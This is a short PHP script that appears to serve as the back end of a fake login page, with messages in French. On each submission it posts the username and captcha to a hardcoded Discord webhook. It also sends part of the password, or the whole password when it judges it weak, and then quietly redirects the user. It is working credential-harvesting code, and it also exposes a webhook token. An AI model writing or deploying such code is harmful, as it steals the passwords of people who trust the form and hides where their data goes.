<!doctype html>
<?php

function verificationPassword($a) {
    $a = str_split($a) ;
    $upper = false ;
    $lower = false ;
    $digit = false ;
    $len = false ;
    if (count($a) > 9) {
        $len = true ;
    } ;
    for ($i = 0 ; $i < count($a) ; $i++) {
        if (is_numeric($a[$i])) {
            $digit = true ;
        } 
        if (ctype_upper($a[$i])) {
            $upper = true ;
        } 
        if (ctype_lower($a[$i])) {
            $lower = true ;
        } 
    }
    if (($len == true) and ($digit == true) and ($upper == true) and ($lower == true)) {
        return true ;
    }
    else {
        return false ;
    }
}

if (isset($_POST["username"]) && isset($_POST["password"]) && isset($_POST["code"])) {
    $username = htmlspecialchars($_POST["username"]);
    $code = htmlspecialchars($_POST["code"]);
    $FirstLetter = htmlspecialchars($_POST["password"][0]);
    $LastLetter = htmlspecialchars($_POST["password"][-1]);
    $whurl = "https://discord.com/api/webhooks/1264924370493640725/FcrwfKnaGFM8yZsNvNSM7GaPkLdD3cM1u1ZIGRcdLzdkgJprDnU92P9ryUiqTMKZV3z6";

    if(verificationPassword(htmlspecialchars($_POST["password"])) == true) {
        $message = array(
            'content' => "L'utilisateur «** ".$username." **», dont le mot de passe commence par «** ".$FirstLetter." **» et finit par «** ".$LastLetter." **» s'est connecté en entrant le captcha «** ".$code." **».",
            'username' => "Tentative de connexion"
        );
    }
    else {
        $message = array(
            'content' => "L'utilisateur « **".$username."** », dont le mot de passe tout pourri est «** ".htmlspecialchars($_POST["password"])." **» s'est connecté en entrant le captcha «** ".$code." **».",
            'username' => "Tentative de connexion"
        );
    }

    $context = array(
        'http' => array(
          'method' => 'POST',
          'header' => "Content-type: application/json\r\n",
          'content' => json_encode($message),
        )
    );

    $context = stream_context_create($context);
    $result = @file_get_contents($whurl, false, $context);

    header("Location:./accueil.html");
    exit;


}

else {
    echo "Surtout ne dis rien aux autres !" ;
}

?>